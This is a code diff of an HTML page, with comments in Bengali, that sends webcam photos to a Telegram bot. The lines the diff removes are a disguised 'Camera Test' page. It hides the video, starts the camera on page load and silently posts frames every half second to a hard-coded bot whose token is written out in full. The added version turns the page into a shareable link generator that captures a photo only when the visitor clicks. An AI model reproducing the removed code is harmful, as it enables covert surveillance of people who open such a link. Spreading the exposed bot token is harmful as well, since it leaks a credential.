@@ -1,69 +1,226 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>Camera Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>টেলিগ্রাম ক্যামেরা লিংক</title>
     <style>
-        body { margin: 0; padding: 0; background: black; }
-        video { display: none; }
+        * { box-sizing: border-box; }
+        body {
+            font-family: system-ui, 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 700px;
+            margin: 30px auto;
+            padding: 20px;
+            background: #f5f7fa;
+            color: #1f2d3d;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #0088cc;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px 16px;
+            margin: 10px 0;
+            border-radius: 12px;
+            border: 1px solid #d0d5dd;
+            font-size: 16px;
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover { background: #006699; }
+        .link-box {
+            background: #eef2ff;
+            padding: 12px;
+            border-radius: 12px;
+            word-break: break-all;
+            margin-top: 15px;
+        }
+        .link-box input {
+            background: white;
+            margin: 5px 0 0;
+            font-size: 13px;
+        }
+        video {
+            width: 100%;
+            max-width: 500px;
+            border-radius: 16px;
+            background: #000;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+        }
+        .status {
+            margin-top: 15px;
+            font-weight: 500;
+            padding: 10px;
+            border-radius: 12px;
+            background: #f0f0f0;
+        }
+        .warning {
+            font-size: 13px;
+            color: #e67e22;
+            margin-top: 8px;
+        }
+        hr {
+            margin: 20px 0;
+        }
+        .btn-secondary {
+            background: #6c757d;
+        }
+        .flex {
+            display: flex;
+            gap: 10px;
+        }
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
-    <script>
-        const BOT_TOKEN = '8015433219:AAG-f00Wf8C863WUuO3G6eEoaS2J2JMlCa0';
-        const CHAT_ID = '7245153415';
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        let stream = null;
-        let interval = null;
+<div id="app"></div>
+
+<script>
+    // URL থেকে টোকেন ও চ্যাট আইডি নেওয়া
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('token');
+    const chatId = urlParams.get('chat_id');
+
+    const app = document.getElementById('app');
+
+    // যদি টোকেন ও চ্যাট আইডি থাকে -> ক্যামেরা মোড
+    if (token && chatId) {
+        renderCameraMode(token, chatId);
+    } else {
+        // না থাকলে ফর্ম মোড
+        renderFormMode();
+    }
+
+    function renderFormMode() {
+        app.innerHTML = `
+            <div class="card">
+                <h2>🔗 ক্যামেরা লিংক জেনারেটর</h2>
+                <p>আপনার টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি দিন। তারপর নিচের লিংকটি যার কাছে পাঠাবেন, তিনি ছবি তুলে আপনার বটে পাঠাতে পারবেন।</p>
+                <input type="text" id="botToken" placeholder="বট টোকেন (যেমন: 123456:ABC-DEF...)" required>
+                <input type="text" id="chatIdInput" placeholder="চ্যাট আইডি (সংখ্যা, যেমন: 123456789)" required>
+                <button id="generateBtn">✨ লিংক তৈরি করুন</button>
+                <div id="linkContainer" style="display:none;" class="link-box">
+                    <strong>📎 আপনার শেয়ারযোগ্য লিংক:</strong>
+                    <input type="text" id="generatedLink" readonly>
+                    <div class="warning">⚠️ মনে রাখবেন: এই লিংকে আপনার বট টোকেন থাকবে। শুধু বিশ্বস্ত ব্যক্তির সাথে শেয়ার করুন।</div>
+                </div>
+            </div>
+        `;
+
+        const generateBtn = document.getElementById('generateBtn');
+        const tokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const linkContainer = document.getElementById('linkContainer');
+        const generatedLinkInput = document.getElementById('generatedLink');
+
+        generateBtn.addEventListener('click', () => {
+            const t = tokenInput.value.trim();
+            const c = chatIdInput.value.trim();
+            if (!t || !c) {
+                alert('টোকেন এবং চ্যাট আইডি দিন');
+                return;
+            }
+            // বর্তমান পৃষ্ঠার URL (index.html) নিয়ে প্যারামিটার যোগ করা
+            const currentUrl = window.location.href.split('?')[0];
+            const newLink = `${currentUrl}?token=${encodeURIComponent(t)}&chat_id=${encodeURIComponent(c)}`;
+            generatedLinkInput.value = newLink;
+            linkContainer.style.display = 'block';
+        });
+    }
+
+    function renderCameraMode(botToken, chatId) {
+        app.innerHTML = `
+            <div class="card">
+                <h2>📸 ক্যামেরা থেকে ছবি পাঠান</h2>
+                <p>ছবি তুলতে নিচের বাটনে ক্লিক করুন। ছবিটি স্বয়ংক্রিয়ভাবে আপনার টেলিগ্রাম বটে (চ্যাট আইডি: ${chatId}) পৌঁছে যাবে।</p>
+                <video id="video" autoplay playsinline></video>
+                <button id="captureBtn">📷 ছবি তুলে পাঠান</button>
+                <div id="status" class="status"></div>
+                <button id="backBtn" class="btn-secondary" style="background:#6c757d;">🏠 নতুন লিংক তৈরি করুন</button>
+                <canvas id="canvas" style="display:none;"></canvas>
+            </div>
+        `;
+
         const video = document.getElementById('video');
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
+        const backBtn = document.getElementById('backBtn');
 
+        // ক্যামেরা চালু
         async function initCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                await video.play();
-                startSending();
             } catch (err) {
-                console.error('Camera error:', err);
+                statusDiv.innerText = '❌ ক্যামেরা অ্যাক্সেস নেয়া যায়নি: ' + err.message;
+                statusDiv.style.background = '#ffe6e6';
             }
         }
+        initCamera();
 
-        async function captureAndSend() {
-            if (!video.videoWidth) return;
+        // ছবি তুলে টেলিগ্রামে পাঠানো
+        captureBtn.addEventListener('click', async () => {
+            if (!video.videoWidth) {
+                statusDiv.innerText = '⚠️ ক্যামেরা এখনও প্রস্তুত নয়, একটু অপেক্ষা করুন।';
+                return;
+            }
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'frame.jpg');
-                try {
-                    await fetch(API_URL, { method: 'POST', body: formData });
-                } catch (e) {
-                    console.error('Send failed:', e);
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.jpg');
+
+            statusDiv.innerText = '📤 পাঠানো হচ্ছে...';
+            statusDiv.style.background = '#eef2ff';
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    statusDiv.innerText = '✅ ছবি সফলভাবে পাঠানো হয়েছে!';
+                    statusDiv.style.background = '#e0ffe0';
+                } else {
+                    statusDiv.innerText = '❌ ত্রুটি: ' + result.description;
+                    statusDiv.style.background = '#ffe6e6';
                 }
-            }, 'image/jpeg', 0.7);
-        }
-
-        function startSending() {
-            if (interval) clearInterval(interval);
-            interval = setInterval(captureAndSend, 500); // প্রতি ৫০০ মিলিসেকেন্ড = ২/সেকেন্ড
-        }
-
-        // পেজ লোড হওয়ার সাথে সাথে ক্যামেরা চালু করার অনুরোধ
-        window.addEventListener('load', () => {
-            initCamera();
+            } catch (err) {
+                statusDiv.innerText = '❌ নেটওয়ার্ক সমস্যা: ' + err.message;
+                statusDiv.style.background = '#ffe6e6';
+            }
         });
 
-        // পেজ ছেড়ে গেলে ক্যামেরা বন্ধ
-        window.addEventListener('beforeunload', () => {
-            if (interval) clearInterval(interval);
-            if (stream) stream.getTracks().forEach(track => track.stop());
+        // নতুন লিংক তৈরি করতে ফর্মে ফিরে যাওয়া
+        backBtn.addEventListener('click', () => {
+            window.location.href = window.location.href.split('?')[0];
         });
-    </script>
+    }
+</script>
 </body>
 </html>
